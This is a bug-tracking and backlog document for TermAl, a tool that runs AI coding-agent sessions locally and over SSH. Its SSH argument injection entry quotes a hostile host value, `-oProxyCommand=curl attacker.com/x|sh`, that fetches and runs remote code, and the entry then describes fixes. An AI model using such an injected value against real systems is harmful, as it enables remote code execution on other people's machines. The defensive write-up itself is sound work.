# Bugs & Known Issues

Updated against the current checked-in code in `src/main.rs`, `ui/src/App.tsx`,
`ui/package.json`, and `ui/vite.config.ts`.

The older entries for "No image paste support", Claude `control_request` fallthrough, "No SSE/WebSocket for real-time updates", "Codex receive has no streaming", "No queueing system for prompts", the stale `/api/state`-after-SSE bootstrap race, the false-positive delta SSE reconciliation drift when a message already existed locally, shared Codex turn-scoped subagent ordering, shared Codex `item_completed` multipart truncation, stale shared-Codex agent-event turn filtering, the shared Codex buffered-result flush edge, multiple simultaneous approvals, Windows `HOME`-only path resolution, process-exit polling, unhandled Codex rate-limit notifications, the stale "Backend persists full state on every streaming text delta" entry, the old unscoped `/api/file` read bug, and the old per-session Codex app-server/runtime note were stale. Those are implemented in the current tree.

The newer shared Codex regressions where stale `task_complete` summaries could bleed into the next
answer or a pre-answer summary insert could overwrite the final-answer preview are also fixed in
the current tree. Parallel-agent progress updates now also use the targeted delta SSE path instead
of forcing full-state snapshots.

The earlier command-card UX issue where `OUT` could render as an empty dark block was also fixed.
Command messages now use a compact `IN` / `OUT` layout with copy controls, a collapsible output
view for longer results, and a plain placeholder when there is no command output.

## SSH argument injection via remote host field

**Severity:** High - crafted host values can execute arbitrary commands through the SSH binary.

`remote_ssh_target()` constructs the SSH target as `user@host` and passes it as a positional arg
to `Command::new("ssh")` without a `--` separator. A crafted `host` like `-oProxyCommand=curl
attacker.com/x|sh` would be interpreted by SSH as an option rather than a hostname, enabling
arbitrary command execution. While `Command::arg()` does not invoke a shell, the SSH binary itself
interprets arguments starting with `-` as options.

**Current impact:**
- A user (or future API caller) who sets a remote host to `-oProxyCommand=...` can execute
  arbitrary commands when any operation triggers SSH connection
- `normalize_remote_configs` only checks that host is non-empty after trimming — no character-class
  validation

**Affected code (src/remote.rs, src/state.rs):**
- `remote_ssh_target()` — constructs the target string
- `RemoteConnection::start_process()` — builds the SSH command without `--` before positional args
- `normalize_remote_configs()` — input validation layer that should reject hostile values

**Fix:**
- Add `command.arg("--")` before the target argument in `start_process()` so SSH treats everything
  after it as positional
- Validate that `host` does not start with `-` and matches a hostname/IP pattern
- Validate that `user` does not contain `@` and matches `[a-zA-Z0-9._-]+`
- Validate that `id` only contains safe characters

## put_review proxy sends scope in body instead of query params

**Severity:** High - remote review saves silently lose session/project context.

When `put_review` is proxied to a remote, `remote_put_json` injects the session/project scope into
the JSON body via `apply_remote_scope_to_body`. However, the remote `put_review` handler extracts
scope from query parameters (`Query<ReviewQuery>`), not from the body. The scope fields are
silently ignored by the remote server.

**Current impact:**
- Remote review saves lose session/project scoping
- The review may be saved without proper storage root resolution on the remote
- The bug is silent — the request succeeds but uses wrong or missing scope

**Affected code (src/remote.rs, src/api.rs):**
- `remote_put_json()` — only supports body injection, no query params
- `apply_remote_scope_to_body()` — injects scope into JSON body
- `put_review` handler in api.rs — reads scope from `Query<ReviewQuery>`

**Fix:**
- Add query parameter support to `remote_put_json` (like `remote_get_json` already has)
- Pass scope as query params instead of embedding in the body for `put_review`

## Removing a remote does not stop its background bridge loop

**Severity:** High - deleted remotes can keep reconnecting forever and duplicate future event consumers.

Project-scoped remotes now start a long-lived SSE bridge thread per remote, but removing a remote
from preferences only drops it from the registry map. The worker started by
`RemoteConnection::start_event_bridge()` keeps running because it has no shutdown signal and the
`event_bridge_started` guard is never reset.

**Current impact:**
- Removing a remote does not actually stop its background reconnect loop
- Re-adding the same remote can create a second bridge worker for the same id
- Duplicate workers can apply the same remote state or delta more than once

**Affected code (`src/remote.rs`):**
- `RemoteRegistry::reconcile()`
- `RemoteConnection::start_event_bridge()`

**Fix:**
- Add an explicit shutdown signal for each remote bridge worker
- Exit the loop when the remote is removed, not just when it is disabled
- Reset the started guard when the worker terminates so a future restart is clean

## Remote snapshot sync leaves ghost sessions behind

**Severity:** High - the UI can keep dead proxy sessions after the remote has already removed them.

Remote session sync currently updates proxy sessions that still appear in a remote snapshot, but it
never removes proxy sessions that disappeared remotely. If a remote session is killed outside the
local control plane or lost during reconnect, the local state keeps a stale proxy record with the
old `remote_session_id`.

**Current impact:**
- Killed remote sessions can remain visible locally as ghost tabs/cards
- Later actions target a remote session id that no longer exists
- The local state can drift permanently until the user manually cleans it up

**Affected code (`src/remote.rs`):**
- `apply_remote_state_snapshot()`
- `sync_remote_state_inner()`

**Fix:**
- Remove remote proxy sessions whose `remote_session_id` is absent from the latest snapshot for
  that remote
- Add a regression test covering remote-side session deletion and reconnect resync

## Remote settings drafts can be overwritten by normal state updates

**Severity:** Medium

The new Remotes settings panel keeps a local draft copy of the remote list, but
`syncPreferencesFromState()` rebuilds `remoteConfigs` from every adopted backend state. During
normal streaming or any unrelated settings update, `RemotePreferencesPanel` sees a new `remotes`
prop and resets its draft state.

**Current impact:**
- Unsaved edits in the Remotes settings tab can disappear while sessions are streaming
- Users can lose in-progress remote config changes without touching the Remotes panel controls
- The issue is hard to notice in testing unless the app is receiving live updates

**Affected code (`ui/src/App.tsx`):**
- `syncPreferencesFromState()`
- `RemotePreferencesPanel`

**Fix:**
- Avoid resetting the draft state when the remote config value is semantically unchanged
- Keep the local draft isolated from unrelated state adoption paths
- Add a frontend regression test for unsaved edits surviving a normal SSE/state refresh

## Create session is still workspace-first even though remote routing is project-scoped

**Severity:** Medium

The project-scoped remote model assumes session routing comes from the selected project, but the
create-session dialog still offers `Current workspace` / `Default workspace`. That path can submit
a remote session's workdir as if it were a local filesystem path, which then fails local directory
validation instead of routing remotely.

**Current impact:**
- Remote users can still pick a workspace-only create-session path that is no longer valid
- A remote current-workspace path can be sent into local workdir validation and fail with a
  confusing error
- The dialog renders a `createSessionProjectSelectionError` slot, but it is currently always `null`

**Affected code (`ui/src/App.tsx`, `src/state.rs`, `src/api.rs`):**
- create-session project selection and submission flow in `App.tsx`
- fallback project/workdir inference in `AppState::create_session()`
- `resolve_session_workdir()` local path validation

**Fix:**
- Make create-session fully project-first for remote-capable routing
- Remove or block the workspace-only path when the current context is remote
- Surface a real selection error instead of leaving the placeholder state unused

## Remote disable semantics do not match the UI copy

**Severity:** Low

The UI presents a remote toggle labeled `Enabled for new projects`, but the backend rejects all use
of a disabled remote, including access through existing projects and sessions. The product copy
implies a narrower effect than the backend actually enforces.

**Current impact:**
- Users can disable a remote expecting only creation to be blocked
- Existing remote projects can become unexpectedly unusable
- The settings surface understates the real impact of the toggle

**Affected code (`ui/src/App.tsx`, `src/state.rs`, `src/remote.rs`):**
- remote settings toggle label in `RemotePreferencesPanel`
- backend remote validation in `create_project()`
- backend remote access validation in `validate_remote_connection_config()`

**Fix:**
- Either rename the setting to communicate that it disables the remote globally
- Or change backend behavior so disabled remotes are hidden from new-project flows but still usable
  for existing bound projects
- Add tests for the chosen semantics so the UI copy and backend behavior stay aligned

## Codex archive state is not tracked locally

**Severity:** Medium

Codex thread actions now expose `archive`, `unarchive`, `compact`, `fork`, and `rollback`, but the
session model still only tracks `external_session_id`. After an archive/unarchive action, TermAl
appends a local note but does not persist any thread lifecycle state, and the shared Codex runtime
still drops `thread/archived` / `thread/unarchived` notifications.

**Current impact:**
- The session card cannot tell whether the current Codex thread is active or archived
- `Archive` and `Unarchive` remain enabled at the same time for any live thread
- Prompt dispatch still treats an archived thread as resumable because the local session model does
  not know it was archived
- Remote or out-of-band archive state changes can drift from the local UI indefinitely

**Affected code (`src/state.rs`, `src/runtime.rs`, `ui/src/App.tsx`, `ui/src/types.ts`):**
- `archive_codex_thread()` / `unarchive_codex_thread()` only persist transcript notes
- shared Codex event handling ignores `thread/archived` and `thread/unarchived`
- `CodexPromptSettingsCard` gates thread actions only on `externalSessionId` and busy state
- `Session` / persisted session snapshots have no archived/live thread state field

**Fix:**
- Add explicit Codex thread lifecycle state to the session model and persisted snapshots
- Update that state on successful local actions and on runtime notifications
- Disable contradictory controls and block prompt dispatch when the live thread is archived



## Failed Claude Task results lose full detail

**Severity:** Low

Completed Claude Task results still emit a full `SubagentResult`, but failed tasks only keep the
preview text stored on the `parallelAgents` row. `summarize_claude_task_detail()` truncates that
detail to the first line / preview limit, and `handle_claude_task_result()` does not emit any
expandable failure message.

**Current impact:**
- A failed task can lose most of its diagnostic output in the transcript
- Users may only see the first line or first ~88 characters of the failure
- Debugging reviewer/subagent failures is harder than debugging successful ones

**Affected code (`src/turns.rs`):**
- `handle_claude_task_result()`
- `summarize_claude_task_detail()`

**Fix:**
- Preserve the full failure detail on the stored parallel-agent state, or
- Emit an expandable failure message alongside the status update

## `insert_message_before` does not update session preview or status

**Severity:** Low

The `push_message` path updates `record.session.preview` and `record.session.status` (e.g. for
`Approval` messages), but `insert_message_before` was refactored to skip those side effects.
Currently safe because `insert_message_before` is only called for `SubagentResult` messages, which
return `None` from `preview_text()`. But the two methods share an identical-looking API surface
while having different behavioral contracts.

**Current impact:**
- No runtime impact today — `SubagentResult` does not produce a preview
- If `insert_message_before` is ever reused for a message type that does have a preview (e.g.
  `Approval`), the session preview will silently not update
- The `DeltaEvent::MessageCreated` published by `insert_message_before` carries the *previous*
  preview and status, which is correct for subagent results but would be stale for other types

**Affected code (`src/state.rs`):**
- `insert_message_before()`
- `push_message()`

**Fix:**
- Add an inline comment documenting that `insert_message_before` intentionally does not update
  preview/status because it is only used for subagent results inserted before existing content
- Alternatively, restore the preview/status logic for consistency and future-proofing

## `ClaudeParallelAgentState` duplicates `ParallelAgentProgress`

**Severity:** Low

`ClaudeParallelAgentState` (in `src/turns.rs`) has the same four fields (`detail`, `id`, `status`,
`title`) as `ParallelAgentProgress` (in `src/api.rs`). The `sync_claude_parallel_agents` function
manually maps from one to the other field-by-field.

**Current impact:**
- If a field is added to `ParallelAgentProgress` (e.g. a new status variant), the
  `ClaudeParallelAgentState` mapping must be updated in lockstep or the new field is silently
  dropped
- Mild code duplication across modules

**Affected code (`src/turns.rs`, `src/api.rs`):**
- `ClaudeParallelAgentState` definition
- `sync_claude_parallel_agents()` mapping logic
- `ParallelAgentProgress` definition

**Fix:**
- Reuse `ParallelAgentProgress` directly in `ClaudeTurnState` instead of maintaining a separate
  type. The only difference is `Clone` vs `Serialize`/`Deserialize` derives, which can coexist.

## Image attachment UX is inconsistent

**Severity:** Low â€” the transport path works, but the product copy and interaction model lag behind it.

The web UI captures pasted image files, converts them to base64 draft attachments, shows previews,
and sends them with `POST /api/sessions/{id}/messages`. The backend validates the payload and now
forwards attachments to both Claude and Codex sessions.

**Current behavior:**
- Paste support exists in the composer for any active session
- Claude prompts encode attachments as image blocks
- Codex prompts encode attachments as `image` input items with data URLs
- Supported formats are PNG, JPEG, GIF, and WebP
- A 5 MB limit is enforced in both the frontend and backend
- Drag-and-drop attachments are still not implemented

**Tasks:**
- Implement drag-and-drop attachment support, or explicitly document paste-only behavior in the UI

## Claude approval cancel can leave a session stuck in Approval

**Severity:** Medium

When Claude emits `control_cancel_request`, TermAl removes the internal pending-approval entry but
does not update the approval message, session status, or preview. If the turn then completes
without another state transition, the session can remain stuck in `Approval`.

**Current impact:**
- The UI can continue showing a canceled approval as if it were still live
- Later prompts get queued because `dispatch_turn()` treats `Approval` as busy
- The session may need to be stopped or restarted to recover

**Affected code (`src/main.rs`):**
- `clear_claude_pending_approval_by_request()`
- `control_cancel_request` handling in the Claude reader loop
- `finish_turn_ok_if_runtime_matches()`, which only transitions `Active -> Idle`

**Fix:**
- When a Claude approval is canceled, update the corresponding message state and republish session state
- Recompute session status from the remaining live approvals instead of leaving it at `Approval`
- Add a regression test for canceled approvals

## Claude hidden session pool is still missing

**Severity:** Medium â€” first Claude message still pays startup cost.

Codex sessions already share a single long-lived app-server. The remaining runtime startup gap is
on the Claude side: runtimes are still created lazily inside `dispatch_turn()`, so a new Claude
session pays process startup plus initialize-handshake latency on its first prompt.

**Current impact:**
- Every new Claude session pays process startup plus initialize-handshake latency on the first prompt
- Users running multiple concurrent Claude sessions per project hit the cold start repeatedly

**Fix:**
- Add a hidden spare session per active `(project, agent)` tuple
- Unhide that spare on session creation instead of cold-starting every new Claude conversation
- Reap idle hidden sessions so the pool does not grow without bound

## Legacy/testing Codex REPL path still uses one-shot `codex exec --json`

**Severity:** Low â€” server mode is fixed, but the old testing path is not.

The server path now uses persistent `codex app-server` JSON-RPC with streaming `item/agentMessage/delta` events. However, `run_turn_blocking()` still routes the Codex REPL/testing mode through `run_codex_turn()`, which shells out to `codex exec --json` or `codex exec resume --json`.

**Impact:**
- REPL mode does not share the persistent app-server runtime
- REPL mode does not share the server approval flow
- Legacy `handle_codex_event()` and rollout-fallback code still have to be maintained

---


## Node 24 deprecation warning from the legacy Vite dev proxy

**Severity:** Low - local dev noise only.

The UI toolchain is still on an older Vite stack:
- `vite` 2.9.18
- `@vitejs/plugin-react` 1.3.2
- `vitest` 0.18.1

When the dev server runs on modern Node releases such as Node 24, Vite's bundled `http-proxy`
path still calls the deprecated `util._extend` helper. TermAl hits that path because
`ui/vite.config.ts` configures `server.proxy` for `/api` and `/api/events`.

**Current behavior:**
- `npm run dev` can print `(node:...) [DEP0060] DeprecationWarning: The util._extend API is deprecated`
- the warning comes from Vite's dev proxy implementation, not from TermAl application code
- `npm run build` and `npm run test` still pass, so this does not block production output

**Proposal:**
- upgrade the frontend dev toolchain together instead of patching `node_modules`
- include at least `vite`, `@vitejs/plugin-react`, and `vitest` in the same refresh
- verify the dev proxy path after the upgrade on current Node, since the warning is tied to the
  proxy code path rather than to React or app logic
- do not spend time replacing the proxy configuration in TermAl just to hide the warning

**Temporary stance:** Until the toolchain refresh is scheduled, treat this as expected local dev
noise.

---
## Feature briefs

- [Project-Scoped Remotes](./features/project-scoped-remotes.md)
- [Session Model Switching](./features/model-switching.md)
- [Slash Commands](./features/slash-commands.md)
- [Gemini CLI Integration](./features/gemini-cli-integration.md)
- [Diff Review Workflow](./features/diff-review-workflow.md)
- [Territory Visualization](./features/territory-visualization.md)
- [Agent Integration Comparison](./features/agent-integration-comparison.md)

# Backlog

## Single-file codebase

**Severity:** Medium â€” maintainability concern, not a runtime bug.

`src/main.rs` is now ~5,700 lines and still contains routes, persistence, session state, Claude integration, Codex integration, REPL code, and tests. The logical boundaries are clear, but the file is past the point where changes are easy to isolate or review.

## Codex app-server integration is partial

**Severity:** Medium â€” server-mode basics are in place, but protocol coverage is still incomplete.

Server mode already uses `codex app-server` over stdio JSON-RPC with:
- `initialize`
- `thread/start` and `thread/resume`
- `turn/start`
- `item/agentMessage/delta`
- approval handling for `item/commandExecution/requestApproval` and `item/fileChange/requestApproval`

**Still missing:**
- REPL migration off the legacy `codex exec --json` path
- persisted session state for archived vs live Codex threads, including notification-driven updates
- transcript backfill after `thread/fork` / `thread/rollback`
- handling for additional app-server request types beyond command/file approvals
- mapping for more notifications beyond the current subset, especially thread lifecycle changes


## Session model controls still need polish

**Severity:** Medium - detailed brief:
- [Session Model Switching](./features/model-switching.md)

Session-scoped model switching is implemented for Claude, Codex, Cursor, and
Gemini. The remaining work is polish: richer capability metadata, stronger
refresh recovery, and deeper end-to-end coverage.

## Agent-native slash commands are still missing

**Severity:** Medium - detailed brief:
- [Slash Commands](./features/slash-commands.md)

TermAl now ships a session-control slash palette for `/model`, `/mode`,
`/sandbox`, `/approvals`, and `/effort`. What is still missing is discovery and
dispatch of the agents' own native slash commands.

## Gemini ACP integration still needs hardening

**Severity:** Medium - detailed brief:
- [Gemini CLI Integration](./features/gemini-cli-integration.md)

Gemini is implemented as a first-class ACP-backed agent now. The remaining work
is hardening: clearer auth/setup recovery, broader ACP protocol coverage, and
more end-to-end testing around model refresh and approval-mode changes.

## Codex app-server and HTTP route coverage is still partial

**Severity:** Medium

There are unit tests for Claude parsing, for the legacy `handle_codex_event()` path, and for a
small subset of the newer Codex app-server notifications. Coverage is still thin for
`handle_codex_app_server_message()` request/item parsing, the new `/codex/thread/*` request flow,
and the remote proxy path. There are still no HTTP route tests for the axum handlers.

## Codex session discovery is reinvented

**Severity:** Low â€” opportunity, not a runtime bug.

Codex already maintains thread state in `~/.codex/state.db`. TermAl still persists its own session list instead of querying Codex's own thread metadata.

If thread discovery eventually moves to Codex's database, TermAl could reuse existing metadata instead of maintaining a parallel index.

## Streaming refresh path is still heavier than necessary

**Severity:** Medium â€” noticeable when one session is streaming and the user is typing in another.

Prompt queueing, queued-prompt cancel, and `Stop` are implemented now. The biggest remaining
latency issue is the refresh path during live streaming.

**What improved already:**
- Draft keystrokes are now local to the composer instead of updating top-level app state on every key
- Session/message identity is preserved across many SSE updates so unchanged cards do not fully churn
- Streamed text and command updates now have a dedicated SSE delta path instead of forcing a full
  state snapshot for every chunk
- Active long conversations now use a windowed message list instead of mounting every message card
- Heavy markdown and code blocks now defer their expensive render work until near the viewport
- Cached conversation pages per pane are now bounded so hidden long tabs do not grow without limit
- Once the UI has a live revision, EventSource reconnects now wait for the stream's initial
  `state` event instead of immediately forcing an extra `/api/state` fetch on every stream error

**What still happens:**
- Delta-gap recovery and explicit full-state events still rerun the broader session reconciliation
  path, so concurrent activity can still make typing feel slower than it should

**Tasks:**
- Profile frontend rerenders during active streaming to identify the remaining hot subtrees

## Command delta inserts lose timestamps

**Severity:** Low â€” user-visible metadata regression.

The new `commandUpdate` delta event can create command messages in the UI before any later full
snapshot arrives, but the delta payload does not include a timestamp.

**Current behavior:**
- The backend creates a real timestamp when it first inserts a command message
- The delta payload only sends command text, output, language metadata, status, and preview
- When the frontend receives the first `commandUpdate` for a message it has not seen before, it
  creates the card with an empty timestamp string

**Impact:**
- Freshly inserted command cards can render blank message metadata
- If no later full state event arrives soon after, the blank timestamp persists indefinitely

**Fix:**
- Include `timestamp` in the `commandUpdate` payload, or keep emitting a full state update when a
  command message is first inserted
- Add a frontend regression test for first-seen command deltas

## Agent replies in diff review comments

**Severity:** Medium - detailed brief:
- [Diff Review Workflow](./features/diff-review-workflow.md)

## No territory visualization

**Severity:** High - detailed brief:
- [Territory Visualization](./features/territory-visualization.md)

- Add click-through navigation from territory entries to the originating conversation message
- Add a persistent territory summary bar visible across all tabs
- Optionally overlay territory indicators in the source view and diff preview tabs

## Spec drift

**Severity:** Low â€” documentation only.

The spec in `docs/claude-pair-spec.md` still describes a Tauri app with IPC commands, while the implementation is an axum server plus a React frontend. It also understates the current Codex app-server integration and still omits Gemini entirely.

---

# Implementation Tasks

Concrete work implied by the current TermAl parity gaps. Ordered by user impact and dependency.

## P0

- [ ] Fix SSH argument injection in remote host field:
  add `--` before the SSH target argument in `start_process()`, validate host/user/id fields
  against character allowlists in `normalize_remote_configs()`.
- [ ] Fix put_review proxy scope routing:
  pass session/project scope as query params instead of embedding in the body, matching how the
  remote handler reads scope from `Query<ReviewQuery>`.
- [ ] Fix remote bridge lifecycle:
  removing a remote must stop its background bridge worker, and restarting the same remote must not
  create duplicate SSE consumers.
- [ ] Reconcile remote snapshot deletions:
  when a remote session disappears from the latest snapshot, remove the matching local proxy
  session instead of leaving a ghost record behind.
- [ ] Fix approval lifecycle bookkeeping:
  canceled Claude approvals should clear the session out of `Approval`, and resolving one approval
  must not hide other live approvals in the same session.

- [ ] Add Gemini as a first-class agent in the backend and UI:
  `Agent` enum, session creation, session rendering, and persistence need to stop assuming the
  world is only Claude or Codex.
- [ ] Implement a persistent Gemini runtime adapter:
  spawn `gemini` with `--output-format stream-json`, map stdout events into TermAl messages, and
  wire message dispatch through the same session runtime path used by Claude and Codex.
- [ ] Expand Codex app-server request handling beyond command/file approvals:
  TermAl should not silently fall back to "unhandled request" logging for additional interactive
  request types.
- [ ] Add territory visualization:
  track per-session file read/write activity in backend state, expose it through `/api/territory`,
  render a project-tree view color-coded by agent with recency decay, heatmap mode, conflict
  warnings, click-through to originating messages, and a persistent summary bar. This is the core
  coordination surface that makes concurrent agent workflows safe and manageable.

## P1

- [ ] Add Claude Task error-result test:
  test that a `tool_result` with `is_error: true` for a Task tool sets
  `ParallelAgentStatus::Error`, does not call `push_subagent_result`, and falls back to "Task
  failed." when detail is empty.
- [ ] Deduplicate `ClaudeParallelAgentState` / `ParallelAgentProgress`:
  reuse `ParallelAgentProgress` in `ClaudeTurnState` and remove the manual field-by-field mapping
  in `sync_claude_parallel_agents`.
- [ ] Document `insert_message_before` contract:
  add an inline comment clarifying that preview/status is intentionally not updated, since the
  method is only used for subagent results inserted before existing content.
- [ ] Make create-session fully project-first for remote routing:
  remove or block the `Current workspace` / `Default workspace` path when it cannot be mapped to a
  concrete project owner, and surface a clear validation error in the dialog.
- [ ] Preserve unsaved Remotes settings drafts during live state updates:
  normal SSE or state refreshes should not wipe in-progress edits in the settings panel.
- [ ] Align disabled remote semantics:
  either treat the toggle as a global disable everywhere or narrow backend behavior so the UI label
  `Enabled for new projects` is truthful.
- [ ] Add native slash command discovery:
  keep the existing session-control slash palette, but also parse and expose
  native agent commands such as Claude's `commands` metadata so TermAl can offer
  `/review`-style workflows directly from the composer.
- [ ] Polish session model controls:
  keep the current session-scoped model switching, but continue improving live
  metadata, validation, recovery flows, and create/clone defaults so the model
  UX feels intentional across Claude, Codex, Cursor, and Gemini.
- [ ] Track Codex archived thread state in local sessions:
  persist whether the live thread is archived, update it from `thread/archived` /
  `thread/unarchived` notifications, and use it to gate prompt dispatch plus the
  Archive/Unarchive controls.
- [ ] Migrate REPL mode off legacy `codex exec --json` and onto the app-server path so server mode
  and REPL mode share one implementation.
- [ ] Hydrate Codex fork/rollback history into local session transcripts:
  thread actions are exposed now, but TermAl only records a local note after `thread/fork` or
  `thread/rollback`; it does not reconstruct the earlier Codex turn history into session messages.
- [ ] Replace the `try_wait()` polling loops in the Claude and Codex runtime supervisors with
  blocking wait threads or async child handling.
- [ ] Add Claude hidden session pool:
  when the first Claude session spawns in a project, create a hidden spare session with a fully
  initialized runtime for the same `(project, cwd)`. On new session creation, unhide the spare
  and spawn the next one. Add `hidden` field to `Session`, filter from UI responses, and add
  idle reaping.
- [ ] Align attachment UX with actual capabilities:
  show the right composer hint per agent, add drag-and-drop, and keep the docs in sync with the
  implementation.
- [ ] Debounce delta persistence:
  stop writing the full state to disk on every streaming text chunk. Accumulate deltas in memory
  and flush periodically (e.g. 500 ms) or on turn completion. Index messages by ID for O(1)
  lookup. Cache `collect_agent_readiness` instead of re-scanning PATH on every snapshot. Move
  disk I/O outside the mutex lock.
- [ ] Reduce streaming refresh overhead:
  profile SSE-driven rerenders while another session is active, narrow state adoption for
  unrelated sessions, and only consider incremental events after the frontend hot path is trimmed.
- [ ] Preserve command timestamps in the delta path:
  include `timestamp` in first-seen `commandUpdate` payloads or force a full state refresh on
  insert so command cards do not render blank metadata.
- [ ] Add post-edit diff preview from agent messages:
  when an agent reports that it updated a file, let the user open a new tab with a diff preview of
  those changes and include a link back to the originating conversation or message.
- [ ] Add saved review comments on diff previews:
  let the user leave PR-style comments on files or hunks, persist them to disk in a structured
  format, and make them available for later agent turns.
- [ ] Add agent replies to diff review comments:
  let the agent post threaded replies on review comment anchors so the diff preview shows a
  back-and-forth conversation instead of one-directional user comments.

## P2

- [ ] Refresh the frontend dev toolchain to remove the Node 24 `util._extend` deprecation from
  Vite's proxy path; upgrade `vite`, `@vitejs/plugin-react`, and `vitest` together and verify
  `npm run dev` with the existing `/api` proxy config.
- [ ] Add unit tests for Codex app-server parsing:
  cover request handling, streaming message assembly, notification filtering, and error paths.
- [ ] Add HTTP route tests for the axum API:
  session creation, message send, settings updates, approvals, kill, the new Codex thread-action
  handlers, and SSE state events.
- [ ] Refresh `docs/claude-pair-spec.md` so the architecture and milestone tracking match the
  current axum + React implementation.
- [ ] Split `src/main.rs` into focused modules once the feature work above stops churning large
  integration surfaces.

## Later
